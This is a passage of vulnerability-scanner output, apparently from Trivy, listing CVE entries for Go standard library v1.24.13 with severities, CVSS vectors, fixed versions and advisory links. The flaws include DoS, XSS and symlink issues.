│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [9] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
│     │      │                  ├ [10]: https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [11]: https://go.dev/cl/797880 
│     │      │                  ├ [12]: https://go.dev/issue/79005 
│     │      │                  ├ [13]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│     │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-39822.html 
│     │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
│     │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
│     │      │                  ├ [17]: https://pkg.go.dev/vuln/GO-2026-4970 
│     │      │                  ╰ [18]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
│     │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
│     │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
│     ├ [30] ╭ VulnerabilityID : CVE-2026-39836 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:d5f9cfbe94ffbf470bedc9572ac907ea6212c6151c42a6ceaefad16899f13cf8 
│     │      ├ Title           : ELSA-2026-22121:  golang security update (IMPORTANT) 
│     │      ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │      │                    containing a NUL (0). 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-476 
│     │      ├ VendorSeverity   ╭ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ╰ photon     : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │      │                  ├ [1]: https://go.dev/issue/79006 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [3]: https://linux.oracle.com/cve/CVE-2026-39836.html 
│     │      │                  ├ [4]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-39836 
│     │      │                  ╰ [6]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:42:40.34Z 
│     ├ [31] ╭ VulnerabilityID : CVE-2026-42499 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4977 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5e0bc88b491e1d395f0285d5f90a2d105e9d20a2b5e4b5f34e18edfef7d06fba 
│     │      ├ Title           : net/mail: golang: net/mail: Denial of Service via pathological email address
│     │      │                   parsing 
│     │      ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an
│     │      │                   email address according to RFC 5322. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1046 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ╰ redhat     : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:17713 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:17714 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:33120 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:33574 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:34364 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36754 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:43038 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [22]: https://access.redhat.com/security/cve/CVE-2026-42499 
│     │      │                  ├ [23]: https://bugzilla.redhat.com/show_bug.cgi?id=2467809 
│     │      │                  ├ [24]: https://go.dev/cl/771520 
│     │      │                  ├ [25]: https://go.dev/issue/78987 
│     │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-42499.html 
│     │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-42499 
│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-4977 
│     │      │                  ├ [31]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42499
│     │      │                  │       .json 
│     │      │                  ╰ [32]: https://www.cve.org/CVERecord?id=CVE-2026-42499 
│     │      ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:18:04.11Z 
│     ├ [32] ╭ VulnerabilityID : CVE-2026-42504 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5038 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:9d74e186bca7b7c0eca1e45f9b8dd1fe16e63d86826ffb0335707936345def3e 
│     │      ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
│     │      ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
│     │      │                   encoded-words can consume excessive CPU. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-407 
│     │      ├ VendorSeverity   ╭ amazon : 2 
│     │      │                  ├ azure  : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
│     │      │                  ├ [1]: https://go.dev/cl/774481 
│     │      │                  ├ [2]: https://go.dev/issue/79217 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
│     │      ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ├ [33] ╭ VulnerabilityID : CVE-2026-27142 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4603 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.8, 1.26.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27142 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0d7402fd0c2ea6a245a768ad44c15d2aea5160cf763dc9100bd97ac6a9d6b2bf 
│     │      ├ Title           : html/template: URLs in meta content attribute actions are not escaped in
│     │      │                   html/template 
│     │      ├ Description     : Actions which insert URLs into the content attribute of HTML meta tags are not
│     │      │                    escaped. This can allow XSS if the meta tag also has an http-equiv attribute
│     │      │                   with the value "refresh". A new GODEBUG setting has been added,
│     │      │                   htmlmetacontenturlescape, which can be used to disable escaping URLs in
│     │      │                   actions in the meta content attribute which follow "url=" by setting
│     │      │                   htmlmetacontenturlescape=0. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ photon : 2 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-27142 
│     │      │                  ├ [1]: https://go.dev/cl/752081 
│     │      │                  ├ [2]: https://go.dev/issue/77954 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/EdhZqrQ98hk 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-27142 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4603 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-27142 
│     │      ├ PublishedDate   : 2026-03-06T22:16:01.177Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:26:44.67Z 
│     ├ [34] ╭ VulnerabilityID : CVE-2026-32282 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4864 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32282 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:af6c071a3cbaeed0da1e46099abce11a7873293255594494fa028db5756a459b 
│     │      ├ Title           : golang: internal/syscall/unix: Root.Chmod can follow symlinks out of the root 
│     │      ├ Description     : On Linux, if the target of Root.Chmod is replaced with a symlink while the
│     │      │                   chmod operation is in progress, Chmod can operate on the target of the
│     │      │                   symlink, even when the target lies outside the root. The Linux fchmodat
│     │      │                   syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses
│     │      │                   to avoid symlink traversal. Root.Chmod checks its target before acting and
│     │      │                   returns an error if the target is a symlink lying outside the root, so the
│     │      │                   impact is limited to cases where the target is replaced with a symlink between
│     │      │                    the check and operation. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-59 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ oracle-oval: 2 
│     │      │                  ├ photon     : 2 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19353 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32282 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2449833 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2455470 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/2456333 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/2456335 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [8] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [9] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [14]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
│     │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [18]: https://errata.almalinux.org/9/ALSA-2026-19353.html 
│     │      │                  ├ [19]: https://errata.rockylinux.org/RLSA-2026:16875 
│     │      │                  ├ [20]: https://go.dev/cl/763761 
│     │      │                  ├ [21]: https://go.dev/issue/78293 
│     │      │                  ├ [22]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [23]: https://linux.oracle.com/cve/CVE-2026-32282.html 
│     │      │                  ├ [24]: https://linux.oracle.com/errata/ELSA-2026-25999.html 
│     │      │                  ├ [25]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
│     │      │                  ├ [26]: https://pkg.go.dev/vuln/GO-2026-4864 
│     │      │                  ╰ [27]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.467Z 
│     │      ╰ LastModifiedDate: 2026-07-25T10:10:00.167Z 
│     ├ [35] ╭ VulnerabilityID : CVE-2026-32288 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4869 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32288 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:456dc8ae394f365f658a7628e7061bad489ad0c9bbe8511f97e71831ac17d486 
│     │      ├ Title           : archive/tar: golang: Go's archive/tar package: Denial of Service via
│     │      │                   maliciously-crafted archive 
│     │      ├ Description     : tar.Reader can allocate an unbounded amount of memory when reading a
│     │      │                   maliciously-crafted archive containing a large number of sparse regions
│     │      │                   encoded in the "old GNU sparse map" format. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ azure  : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 2 
│     │      │                  ├ redhat : 2 
│     │      │                  ╰ ubuntu : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L 
│     │      │                            ╰ V3Score : 4.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32288 
│     │      │                  ├ [1]: https://go.dev/cl/763766 
│     │      │                  ├ [2]: https://go.dev/issue/78301 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32288 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4869 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32288 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.707Z 
│     │      ╰ LastModifiedDate: 2026-07-25T10:10:00.167Z 
│     ├ [36] ╭ VulnerabilityID : CVE-2026-32289 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4865 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32289 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:c5fa2de7c210ac5e9021ab34858354dfba8bd4bcdf5cb80d638b732768066682 
│     │      ├ Title           : html/template: golang: html/template: Cross-Site Scripting (XSS) via improper
│     │      │                   context and brace depth tracking in JS template literals 
│     │      ├ Description     : Context was not properly tracked across template branches for JS template
│     │      │                   literals, leading to possibly incorrect escaping of content when branches were
│     │      │                    used. Additionally template actions within JS template literals did not
│     │      │                   properly track the brace depth, leading to incorrect escaping being applied.
│     │      │                   These issues could cause actions within JS template literals to be incorrectly
│     │      │                    or improperly escaped, leading to XSS vulnerabilities. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 2 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32289 
│     │      │                  ├ [1]: https://go.dev/cl/763762 
│     │      │                  ├ [2]: https://go.dev/issue/78331 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32289 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4865 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32289 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.82Z 
│     │      ╰ LastModifiedDate: 2026-07-25T10:10:00.167Z 
│     ├ [37] ╭ VulnerabilityID : CVE-2026-39823 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:031519f099c5a543a6bbe2269394a6c1bb3792fb1a6f8ff63a207ae21fe7b5a5 
│     │      ├ Title           : html/template: golang: Go html/template: Cross-Site Scripting via improper URL
│     │      │                    escaping in meta tag content 
│     │      ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │      │                   inside of a <meta> tag's <content> attribute. If the URL content were to
│     │      │                   insert ASCII whitespaces around the '=' rune inside of the <content>
│     │      │                   attribute, the escaper would fail to similarly escape it, leading to XSS. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 2 
│     │      │                  ╰ redhat     : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-39823 
│     │      │                  ├ [1]: https://go.dev/cl/769920 
│     │      │                  ├ [2]: https://go.dev/issue/78913 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2026-39823.html 
│     │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-39823 
│     │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-39823 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:42:38.473Z 
│     ├ [38] ╭ VulnerabilityID : CVE-2026-39825 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0f4f02e599537a7c5a1e8c4699b000d8284a9535f7c3734c432d7a64895eaa9f 
│     │      ├ Title           : net/http/httputil: golang: net/http/httputil: ReverseProxy forwards hidden
│     │      │                   query parameters, potentially bypassing security controls 
